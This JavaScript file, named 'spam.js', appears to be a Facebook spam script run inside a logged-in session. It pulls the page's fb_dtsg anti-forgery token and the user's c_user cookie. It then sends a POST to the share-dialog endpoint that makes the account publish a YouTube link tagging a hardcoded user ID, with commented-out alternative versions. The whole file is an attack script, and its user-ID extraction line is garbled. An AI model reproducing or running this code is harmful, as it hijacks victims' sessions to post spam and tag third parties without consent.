console["log"]("spam.js");
var Status = 2;
var cantidad = 1;
var cantidadAmigos = 1;
//var share_url = "https://facebook.com";

var share_url = "https://www.youtube.com/watch?v=j65L6eB34m0";


var fb_dtsg = document["getElementsByName"]("fb_dtsg")[0]["value"];//1
var user_id = document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);//2

var arkadaslar = [];//3
var svn_rev;//4
var app_id = "1376285782405081";//5
function bpr(j, e) {
    var k = "";//7
    if ("mix" == e) {
        var g = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz-0123456789"
    } else {
        var g = "0123456789"
    }
    ;//7
    for (var h = 0x0; j > h; h++) {
        k += g["charAt"](Math["floor"](Math["random"]() * g["length"]))
    }
    ;//7
    return k
}

var idamigos = "100072185238221";
var placecolocar = "Argentina";

//var l = new XMLHttpRequest();//10
var a = "";//11
a = "jazoest=22037";
a += "&fb_dtsg=" + fb_dtsg;
a += "&mode=self";
a += "&audience_targets=" + user_id;
a += "&av=";
a += "&app_id=" + app_id;
a += "&redirect_uri=https://www.facebook.com/dialog/return/close";
a += "&fallback_redirect_uri=";
a += "&display=popup";
a += "&access_token=";
a += "&sdk=";
a += "&user_code=";
a += "&from_post=1";
a += "&xhpc_context=home";    
a += "&xhpc_timeline=";
a += "&xhpc_targetid=" + user_id;
a += "&xhpc_publish_type=1";
a += "&xhpc_message_text=";
a += "&xhpc_message=";
a += "&quote=&is_explicit_place=";
a += "&composertags_place=Argentina";
a += "&composertags_place_name=Argentina";
a += "&tagger_session_id=" + Date["now"]();    
a += "&tags="+idamigos;
a += "&action_type_id[0]=";
a += "&object_str[0]=";
a += "&object_id[0]=";
a += "&hide_object_attachment=0";
a += "&og_suggestion_mechanism=";
a += "&og_suggestion_logging_data=";
a += "&icon_id=";
a += "&share_action_properties={\"object\":\"" + share_url + "\",\"place\":\"" + placecolocar + "\",\"tags\":\"" + idamigos + "\"}";
a += "&device_code=";
a += "&device_shared=";
a += "&ref=";
a += "&media=";
a += "&dialog_url=https://www.facebook.com/dialog/share?u";
a += "&composertags_city=";
a += "&disable_location_sharing=false";
a += "&composer_predicted_city=";
a += "&feed_selector=on";
a += "&privacyx=291667064279714";
a += "&__CONFIRM__=1";
a += "&__user=" + user_id;
a += "&__a=1";
a += "&__dyn=" + bpr(130, "mix"), a += "&__req=9";
a += "&__be=1";
a += "&__pc=PHASED:ufi_home_page_pkg";
a += "&dpr=1";
a += "&__rev=1000729864";

/*
let respuesta = l["open"]("POST", "/v2.9/dialog/share/submit", true);
l["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
l["onreadystatechange"] = function () {
    if (l["readyState"] == 4 && l["status"] == 200) {
        l["close"];
        //if (fin) {
            console.log(l);
            console.log("OK!!!");
            console.log("respuesta:");
            console.log(respuesta);
            //window.location.href = "https://www.facebook.com/profile.php?id=" + user_id + "#!OK";
        //}
    }

}
    ;
l["send"](a);
//console["log"](c)
*/

const xhr = new XMLHttpRequest();
xhr.open("POST", "/v2.9/dialog/share/submit", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")

const body = JSON.stringify({
    jazoest: 22037,
    fb_dtsg: fb_dtsg,
    mode: "self"
});
xhr.onload = () => {
    if (xhr.readyState == 4 && xhr.status == 200) {
        console.log("responseText:");
        console.log(xhr.responseText);
        //console.log(JSON.parse(xhr.responseText));
        //console.log(JSON.parse(xhr.responseText));
    } else {
        console.log(`Error: ${xhr.status}`);
    }
};
let respuesta = xhr.send(a);

console.log("respuesta:");
console.log(respuesta);


// 7210381845435321488
/*

fetch('/v2.9/dialog/share/submit'+a, {
    method: 'POST',
    headers: {        
        'Content-Type': "application/x-www-form-urlencoded"
    },
    //body: JSON.stringify({ "id": 78912 })
})
.then(response => response.json())
.then(response => console.log(JSON.stringify(response)))

*/